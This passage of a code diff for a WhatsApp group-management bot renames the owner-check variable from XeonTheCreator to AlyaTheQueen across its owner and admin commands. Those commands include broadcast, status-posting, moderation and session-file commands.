+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (text.startsWith('v')) {
                   typereply = text
                   replygcalya(mess.done)
@@ -1887,7 +2275,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'statustext': 
             case 'upswtext':
             case 'upswteks': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!q) return replygcalya('Text?')
                await AlyaBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
                replygcalya(mess.done)
@@ -1895,7 +2283,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'statusvideo':
             case 'upswvideo': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (/video/.test(mime)) {
                   var videosw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                   await AlyaBotInc.sendMessage('status@broadcast', {
@@ -1913,7 +2301,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'statusimg':
             case 'statusimage':
             case 'upswimg': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (/image/.test(mime)) {
                   var imagesw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                   await AlyaBotInc.sendMessage('status@broadcast', {
@@ -1930,7 +2318,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'statusaudio':
             case 'upswaudio': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (/audio/.test(mime)) {
                   var audiosw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                   await AlyaBotInc.sendMessage('status@broadcast', {
@@ -1951,7 +2339,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'setimgmenu':
             case 'sim': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                 await fsx.copy(delb, './AlyaMedia/theme/alya.jpg')
                 fs.unlinkSync(delb)
@@ -1962,7 +2350,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'svm': 
             	case 'setvgifmenu':
             case 'sgm': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                 await fsx.copy(delb, './AlyaMedia/theme/Cheems-bot.mp4')
                 fs.unlinkSync(delb)
@@ -1970,7 +2358,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
             case 'addtitle':{
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Usage ${prefix + command} number|title`)
                nonya = text.split('|')[0]
                titlenya = text.split('|')[1]
@@ -1980,7 +2368,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
             case 'deltitle':{
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Usage ${prefix + command} number`)
                nonya = text.split(',')[0]
                let oo = `${nonya}@s.whatsapp.net`
@@ -1990,7 +2378,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'addlimit':
             case 'givelimit':{
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Usage ${prefix + command} number|limit amount`)
                 usernya = text.split('|')[0]
                 limitnya = text.split('|')[1]
@@ -2000,7 +2388,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
             case 'dellimit':{
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Usage ${prefix + command} number|limit amount`)
                 usernya = text.split('|')[0]
                 limitnya = text.split('|')[1]
@@ -2010,7 +2398,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
             case 'addprem':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (args.length < 2)
                     return replygcalya(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                 if (m.mentionedJid.length !== 0) {
@@ -2024,7 +2412,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 }
             break
             case 'delprem':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (args.length < 1) return replygcalya(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2348100835767`)
                 if (m.mentionedJid.length !== 0) {
                     for (let i = 0; i < m.mentionedJid.length; i++) {
@@ -2039,7 +2427,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 }
             break
             case 'listprem': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 let data = require('./src/data/role/premium.json')
                 let txt = `*------「 LIST PREMIUM 」------*\n\n`
                 for (let x of data) {
@@ -2055,7 +2443,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
 case 'addowner':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!args[0]) return replygcalya(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await AlyaBotInc.onWhatsApp(bnnd)
@@ -2065,7 +2453,7 @@ fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
 replygcalya(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!args[0]) return replygcalya(`Use ${prefix+command} nomor\nExample ${prefix+command} 2348100835767`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
@@ -2084,7 +2472,7 @@ case 'listowner': {
             break
             case 'delsession':
             case 'clearsession': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 fs.readdir("./session", async function(err, files) {
                     if (err) {
                         console.log('Unable to scan directory: ' + err);
@@ -2112,7 +2500,7 @@ case 'listowner': {
             break
             case 'join':
                 try {
-                    if (!XeonTheCreator) return AlyaStickOwner()
+                    if (!AlyaTheQueen) return AlyaStickOwner()
                     if (!text) return replygcalya('Enter Group Link!')
                     if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcalya('Link Invalid!')
                     let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -2123,7 +2511,7 @@ case 'listowner': {
                 }
                 break
             case 'getsession':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 replygcalya('Wait a moment, currently retrieving your session file')
                 let sesi = fs.readFileSync('./session/creds.json')
                 AlyaBotInc.sendMessage(m.chat, {
@@ -2136,7 +2524,7 @@ case 'listowner': {
             break
             case 'myip':
             case 'ipbot':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 var http = require('http')
                 http.get({
                     'host': 'api.ipify.org',
@@ -2175,13 +2563,13 @@ case 'listowner': {
         }
         break
             case 'shutdown':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 replygcalya(`Restarting will be completed in seconds`)
                 await sleep(3000)
                 process.exit()
             break
             case 'autoread':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (q === 'on') {
                     db.data.settings[botNumber].autoread = true
                     replygcalya(`Successfully changed autoread to ${q}`)
@@ -2252,7 +2640,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'unavailable':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (q === 'on') {
                     db.data.settings[botNumber].online = true
                     replygcalya(`Successfully changed unavailable to ${q}`)
@@ -2323,7 +2711,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autorecordtype':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q === 'on') {
                     db.data.settings[botNumber].autorecordtype = true
@@ -2395,7 +2783,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autorecord':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q === 'on') {
                     db.data.settings[botNumber].autorecord = true
@@ -2467,7 +2855,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autotype':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q === 'on') {
                     db.data.settings[botNumber].autotype = true
@@ -2539,7 +2927,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autobio':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].autobio = true
@@ -2611,7 +2999,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autosticker': case 'autostickergc':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].autosticker = true
@@ -2683,7 +3071,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autodownload': case 'autodl':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].autodownload = true
@@ -2755,7 +3143,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'autoblock':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].autoblocknum = true
@@ -2828,7 +3216,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'onlygroup':
             case 'onlygc':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].onlygrub = true
@@ -2901,7 +3289,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'onlyprivatechat':
             case 'onlypc':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].onlypc = true
@@ -2974,7 +3362,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'onlyindia':
             case 'onlyindianumber':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].onlyindia = true
@@ -3047,7 +3435,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'onlyindo':
             case 'onlyindonumber':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 
                 if (q == 'on') {
                     db.data.settings[botNumber].onlyindo = true
@@ -3119,7 +3507,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
             break
             case 'self': case 'public': case 'mode': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (q == 'on') {
                 AlyaBotInc.public = true
                 replygcalya('*Successful in Changing To Public Usage*')
@@ -3192,26 +3580,26 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'setexif':
             case 'setwm':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                 global.packname = text.split("|")[0]
                 global.author = text.split("|")[1]
                 replygcalya(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                 break
                 case 'setprefix':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                 global.xprefix = text
                 replygcalya(`Prefix successfully changed to ${text}`)
                 break
                 case 'setautoblock':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                 global.autoblocknumber = text
                 replygcalya(`Auto-Block number successfully changed to ${text}`)
                 break
                 case 'setantiforeign':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Example : ${prefix + command} packname|author`)
                 global.antiforeignnumber = text
                 replygcalya(`Anti-foreign number successfully changed to ${text}`)
@@ -3220,7 +3608,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'setpp':
             case 'setpp':
             case 'setppbot':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                 if (!/image/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                 if (/webp/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
@@ -3256,14 +3644,14 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 break
             case 'leave':
             case 'out':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!m.isGroup) return AlyaStickGroup()
                 replygcalya('Bye Everyone 🥺')
                 await AlyaBotInc.groupLeave(m.chat)
             break
             case 'bc':
             case 'broadcast': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya('Text?')
                let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
                for (let i of Object.keys(global.db.data.users)) {
@@ -3290,7 +3678,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             }
             break
             case 'jpm': case 'post': {
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!text) return replygcalya(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
 await replygcalya(`Waiting in progress`)
 let getGroups = await AlyaBotInc.groupFetchAllParticipating()
@@ -3312,7 +3700,7 @@ replygcalya(`Success`)
 }
 break
             case 'pushcontact': {
-    if (!XeonTheCreator) return AlyaStickOwner()
+    if (!AlyaTheQueen) return AlyaStickOwner()
       if (!m.isGroup) return replygcalya(`The feature works only in grup`)
     if (!text) return replygcalya(`text?`)
     let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
@@ -3324,7 +3712,7 @@ break
       }
       break
 case "pushcontactv2":{
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!q) return replygcalya(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
 await AlyaStickWait()
 const metadata2 = await AlyaBotInc.groupMetadata(q.split("|")[0])
@@ -3337,7 +3725,7 @@ replygcalya(`Success`)
 }
 break
 case 'pushcontactv3':
-if (!XeonTheCreator) return AlyaStickOwner()
+if (!AlyaTheQueen) return AlyaStickOwner()
 if (!isGroup) return AlyaStickGroup()
 if (!text) return replygcalya(
 `
@@ -3367,14 +3755,14 @@ await sleep(jedany)
 replygcalya(`Success`)
 break
 case 'block': case 'ban': {
-		if (!XeonTheCreator) return AlyaStickOwner()
+		if (!AlyaTheQueen) return AlyaStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 		await AlyaBotInc.updateBlockStatus(users, 'block')
 		await replygcalya(`Done`)
 	}
 	break
 	case 'unblock': case 'unban': {
-		if (!XeonTheCreator) return AlyaStickOwner()
+		if (!AlyaTheQueen) return AlyaStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 		await AlyaBotInc.updateBlockStatus(users, 'unblock')
 		await replygcalya(`Done`)
@@ -3382,7 +3770,7 @@ case 'block': case 'ban': {
 	break
             case 'bcgc':
             case 'bcgroup': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 if (!text) return replygcalya(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                 let getGroups = await AlyaBotInc.groupFetchAllParticipating()
                 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
@@ -3410,7 +3798,7 @@ case 'block': case 'ban': {
             }
             break
             case 'getcase':
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 try {
                    const getCase = (cases) => {
                       return "case" + `'${cases}'` + fs.readFileSync("Queenalya.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
@@ -3425,7 +3813,7 @@ case 'delcase':
         return replygcalya('You are not authorized to use this command.');
     }
 
-    if (!XeonTheCreator) return AlyaStickOwner();
+    if (!AlyaTheQueen) return AlyaStickOwner();
     try {
         const deleteCaseFromScript = (cases) => {
             const fileContent = fs.readFileSync("Queenalya.js").toString();
@@ -3457,7 +3845,7 @@ case 'addcase':
         return replygcalya('You are not authorized to use this command.');
     }
 
-    if (!XeonTheCreator) return AlyaStickOwner();
+    if (!AlyaTheQueen) return AlyaStickOwner();
 
     try {
         const addCaseToScript = (caseContent) => {
@@ -3494,7 +3882,7 @@ case 'addcase':
             case 'antitoxic':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].badword = true
@@ -3567,7 +3955,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                }
             break
             case 'react': {
-                if (!XeonTheCreator) return AlyaStickOwner()
+                if (!AlyaTheQueen) return AlyaStickOwner()
                 reactionMessage = {
                     react: {
                         text: args[0],
@@ -3580,7 +3968,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
            case 'nsfw': {
 if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
 if (args[0] === "on") {
 if (AntiNsfw) return replygcalya('Already activated')
 ntnsfw.push(from)
@@ -3673,7 +4061,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antiaudio':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antiaudio = true
@@ -3748,7 +4136,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antiforeign':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[m.chat].antiforeignnum = true
@@ -3821,7 +4209,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                }
             break
             case 'poll': {
-	if (!XeonTheCreator) return AlyaStickOwner()
+	if (!AlyaTheQueen) return AlyaStickOwner()
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
                 return await replygcalya(
@@ -3842,7 +4230,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antipoll':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antipoll = true
@@ -3917,7 +4305,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antisticker':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antisticker = true
@@ -3992,7 +4380,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antiimage':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antiimage = true
@@ -4067,7 +4455,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antivideo':{
             	if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antivideo = true
@@ -4142,7 +4530,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antivirtex':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antivirtex = true
@@ -4217,7 +4605,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antibot':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antibot = true
@@ -4309,7 +4697,7 @@ break
             case 'antiviewonce':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antiviewonce = true
@@ -4384,7 +4772,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antispam':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antispam = true
@@ -4459,7 +4847,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antimedia':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antimedia = true
@@ -4534,7 +4922,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antidocument':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                
                if (args[0] === 'on') {
                   db.data.chats[from].antidocument = true
@@ -4609,7 +4997,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'anticontact':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
          
                if (args[0] === 'on') {
                   db.data.chats[from].anticontact = true
@@ -4684,7 +5072,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antilocation':{
 		         if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   db.data.chats[from].antilocation = true
                   replygcalya(`${command} is enabled`)
@@ -4758,7 +5146,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antilink': {
                if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   db.data.chats[from].antilink = true
                   replygcalya(`${command} is enabled`)
@@ -4832,7 +5220,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antilinkgc': {
                if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   db.data.chats[from].antilinkgc = true
                   replygcalya(`${command} is enabled`)
@@ -4906,7 +5294,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'antipromotion': {
                if (!m.isGroup) return AlyaStickGroup()
 if (!isBotAdmins) return AlyaStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   db.data.chats[from].antipromotion = true
                   replygcalya(`${command} is enabled`)
@@ -4980,7 +5368,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             case 'welcome':
             case 'left': {
                if (!m.isGroup) return AlyaStickGroup()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   welcome = true
                   replygcalya(`${command} is enabled`)
@@ -5053,7 +5441,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'adminevent': {
                if (!m.isGroup) return AlyaStickGroup()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   adminevent = true
                   replygcalya(`${command} is enabled`)
@@ -5126,7 +5514,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
 case 'groupevent': {
                if (!m.isGroup) return AlyaStickGroup()
-if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (args[0] === 'on') {
                   groupevent = true
                   replygcalya(`${command} is enabled`)
@@ -5211,7 +5599,7 @@ let link = 'https://chat.whatsapp.com/' + await AlyaBotInc.groupInviteCode(group
 break
             case 'closetime':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !XeonTheCreator) return AlyaStickAdmin()
+                if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (args[1] == 'second') {
                     var timer = args[0] * `1000`
@@ -5234,7 +5622,7 @@ break
                 break
             case 'opentime':
                 if (!m.isGroup) return AlyaStickGroup()
-                if (!isAdmins && !XeonTheCreator) return replygcalya(mess.admin)
+                if (!isAdmins && !AlyaTheQueen) return replygcalya(mess.admin)
                 if (!isBotAdmins) return AlyaStickBotAdmin()
                 if (args[1] == 'second') {
                     var timer = args[0] * `1000`
@@ -5256,9 +5644,9 @@ break
                 }, timer)
                 break
             case 'kick':
